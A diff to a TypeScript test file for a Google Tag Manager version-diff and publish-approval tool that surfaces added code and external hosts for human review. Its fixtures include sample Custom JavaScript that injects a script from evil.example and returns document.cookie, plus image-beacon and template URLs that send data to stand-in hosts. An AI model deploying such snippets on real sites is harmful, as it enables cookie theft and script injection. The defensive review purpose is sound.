@@ -105,7 +105,19 @@ describe("diffVersions", () => {
     expect(d.entries.map((e) => [e.status, e.id, e.name])).toEqual([["changed", "3", "A"], ["changed", "2", "B renamed"], ["removed", "4", "Gone"], ["added", "5", "Pixel"]]);
     expect(d.entries[1]!.fields).toEqual([{ field: "name", before: "B", after: "B renamed" }]);
     const rows = d.rows.map((r) => [r.id, r.field, r.effect]);
-    expect(rows).toEqual([["3", "paused", "pause"], ["2", "name", "neutral"], ["4", "tag", "remove"], ["5", "tag", "create"], ["5", "parameter.html", "create"]]);
+    expect(rows).toEqual([
+      ["3", "paused", "pause"],
+      ["2", "name", "neutral"],
+      ["4", "tag", "remove"],
+      ["4", "type", "remove"],
+      ["4", "paused", "remove"],
+      ["4", "firing triggers", "remove"],
+      ["5", "tag", "create"],
+      ["5", "type", "create"],
+      ["5", "paused", "create"],
+      ["5", "firing triggers", "create"],
+      ["5", "parameter.html", "create"],
+    ]);
     expect(d.rows.find((r) => r.field === "parameter.html")!.after).toBe(html);
   });
 
@@ -128,6 +140,37 @@ describe("diffVersions", () => {
     expect(d.entries.map((e) => `${e.kind}:${e.status}:${e.name}`)).toEqual(["trigger:added:New", "variable:removed:V", "built_in_variable:added:Event"]);
     expect(d.coarse.map((c) => `${c.kind}:${c.status}:${c.name}`)).toEqual(["folder:removed:F", "custom_template:changed:Consent", "zone:added:Z"]);
     expect(d.coarse[1]!.detail).toMatch(/^code changed \(sha256 [0-9a-f]{12} → [0-9a-f]{12}\)$/);
+    expect(d.rows.filter((r) => r.field === "templateData")).toEqual([expect.objectContaining({ before: "old", after: "new", effect: "neutral" })]);
+  });
+
+  const JS = "function(){var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s);return document.cookie}";
+  const TPL = "const injectScript = require('injectScript');\ninjectScript('https://evil.example/t.js', data.gtmOnSuccess, data.gtmOnFailure);";
+  it("added entities show every setting and parameter; Custom JavaScript and template code in full in their own rows", () => {
+    const d = diffVersions(
+      V("1", []),
+      V("2", [T({ tagId: "7", name: "Beacon", type: "img", parameter: [{ type: "template", key: "url", value: "https://evil.example/c?d={{JS}}" }, { type: "boolean", key: "useCacheBuster", value: "true" }], firingTriggerId: ["2147479553"] })], {
+        variable: [{ variableId: "9", name: "JS", type: "jsm", parameter: [{ type: "template", key: "javascript", value: JS }] }],
+        customTemplate: [{ templateId: "3", name: "Loader", templateData: TPL }],
+      }),
+    );
+    const row = (id: string, field: string) => d.rows.find((r) => r.id === id && r.field === field);
+    expect(row("7", "parameter.url")).toMatchObject({ before: null, after: "https://evil.example/c?d={{JS}}", effect: "create" });
+    expect(row("7", "parameter.useCacheBuster")?.after).toBe("true");
+    expect(row("9", "parameter.javascript")).toMatchObject({ after: JS, effect: "create" });
+    expect(d.rows.filter((r) => r.id === "9").map((r) => r.field)).toEqual(["variable", "type", "parameter.javascript"]);
+    expect(row("Loader", "templateData")).toMatchObject({ before: null, after: TPL, effect: "create" });
+    expect(row("Loader", "settings")?.after).toBe('{"templateId":"3"}');
+    // removed: the same rows, as before values
+    const r = diffVersions(V("2", [], { variable: [{ variableId: "9", name: "JS", type: "jsm", parameter: [{ type: "template", key: "javascript", value: JS }] }] }), V("3", []));
+    expect(r.rows.find((x) => x.field === "parameter.javascript")).toMatchObject({ before: JS, after: null, effect: "remove" });
+  });
+
+  it("a changed 5,000-character Custom JavaScript is shown in full, not cut", () => {
+    const old = `function(){return '${"a".repeat(5000)}'}`;
+    const now = `function(){return '${"b".repeat(4990)}'+new Image().src='//203.0.113.9/p'}`;
+    const vars = (js: string) => ({ variable: [{ variableId: "9", name: "JS", type: "jsm", parameter: [{ type: "template", key: "javascript", value: js }] }] });
+    const d = diffVersions(V("1", [], vars(old)), V("2", [], vars(now)));
+    expect(d.rows).toEqual([expect.objectContaining({ id: "9", field: "parameter.javascript", before: old, after: now, effect: "neutral" })]);
   });
 });
 
@@ -145,7 +188,7 @@ describe("publish_gtm_version", () => {
     expect(r.approval!.risk).toBe("destructive");
     expect(r.approval!.summary).toContain("PUBLISH to the LIVE website: container GTM-ABC123, shop.example, web. Version 42 \"Add pixel\" replaces live version 41 \"Consent update\"");
     expect(r.approval!.summary).toContain("Tags: 1 added, 0 changed, 0 removed.");
-    expect(r.approval!.summary).toContain('Added custom HTML "Meta Pixel - v2" runs on pages matched by All pages (custom) (32) and loads from connect.facebook.net');
+    expect(r.approval!.summary).toContain('Added custom HTML tag "Meta Pixel - v2" runs on pages matched by All pages (custom) (32); hosts found: connect.facebook.net');
     expect(r.approval!.summary).toContain("to roll back, publish version 41 again");
     expect(r.approval!.change_set!.changes).toContainEqual(expect.objectContaining({ field: "parameter.html", after: "<script src='https://connect.facebook.net/x.js'></script>" }));
     // the approval page renders every row with the code escaped
@@ -173,12 +216,40 @@ describe("publish_gtm_version", () => {
     expect(f.writes()).toEqual([]);
   });
 
+  it("added Custom JavaScript, image tag and template: code and URLs in the change set and summary; over-long code refused", async () => {
+    const JS = "function(){var s=document.createElement('script');s.src=`https://evil.example/x.js`;document.head.appendChild(s);return 1}";
+    const TPL = "const injectScript = require('injectScript');\ninjectScript('https://tpl.example/t.js', data.gtmOnSuccess, data.gtmOnFailure);";
+    const withExtras = (js: string, tpl: string) => {
+      const v = prepare([...(f.versions[0]!.tag ?? []), { tagId: "70", name: "Beacon", type: "img", parameter: [{ type: "template", key: "url", value: "https://evil.example/c?d={{JS}}" }], firingTriggerId: ["32"] }], "44");
+      v.variable = [...(v.variable ?? []), { variableId: "90", name: "JS", type: "jsm", parameter: [{ type: "template", key: "javascript", value: js }] }];
+      v.customTemplate = [{ templateId: "5", name: "Loader", templateData: tpl }];
+    };
+    withExtras(JS, TPL);
+    const r = await run("publish_gtm_version", { version_id: "44" });
+    expect(r.error).toBeUndefined();
+    const ch = r.approval!.change_set!.changes;
+    expect(ch).toContainEqual(expect.objectContaining({ id: "90", field: "parameter.javascript", after: JS, effect: "create" }));
+    expect(ch).toContainEqual(expect.objectContaining({ id: "70", field: "parameter.url", after: "https://evil.example/c?d={{JS}}" }));
+    expect(ch).toContainEqual(expect.objectContaining({ id: "Loader", field: "templateData", after: TPL }));
+    expect(r.approval!.summary).toContain('Added Custom JavaScript variable "JS"; hosts found: evil.example');
+    expect(r.approval!.summary).toContain('Added custom template "Loader" (its code runs wherever a tag or variable uses it); hosts found: tpl.example');
+    f.versions.pop();
+    withExtras("x".repeat(20_001), TPL);
+    expect((await run("publish_gtm_version", { version_id: "44" })).error?.message).toContain("too large to show");
+    f.versions.pop();
+    withExtras(JS, "y".repeat(20_001));
+    expect((await run("publish_gtm_version", { version_id: "44" })).error?.message).toContain("too large to show");
+    expect(f.writes()).toEqual([]);
+  });
+
   it("an older version is a rollback; a never-published container diffs against nothing", async () => {
     f.addVersion({ ...JSON.parse(JSON.stringify(f.versions[0]!)), containerVersionId: "40", name: "Old", tag: [] });
     const r = await run("publish_gtm_version", { version_id: "40" });
     expect(r.approval!.summary).toContain("OLDER version");
     expect(r.approval!.summary).toContain("Tags: 0 added, 0 changed, 4 removed.");
-    expect(r.approval!.change_set!.changes.filter((c) => c.effect === "remove")).toHaveLength(5); // 4 tags + the html code row
+    const removed = r.approval!.change_set!.changes.filter((c) => c.effect === "remove");
+    expect(removed.filter((c) => c.field === "tag")).toHaveLength(4);
+    expect(removed.filter((c) => c.field === "parameter.html")).toHaveLength(1);
     f.liveId = null;
     const r2 = await run("publish_gtm_version", { version_id: "41" });
     expect(r2.approval!.summary).toContain("becomes the first live version");
